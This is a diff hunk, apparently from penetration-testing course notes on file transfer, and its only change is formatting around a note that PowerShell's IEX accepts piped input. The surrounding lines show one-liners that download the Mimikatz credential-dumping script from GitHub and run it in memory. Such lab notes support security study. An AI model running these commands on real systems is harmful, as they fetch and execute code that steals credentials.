@@ -50,7 +50,9 @@ PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubuserc
 PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
 ```
+
 > [!NOTE] IEX also accepts pipeline input. 
+
 ```
 PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
 ```
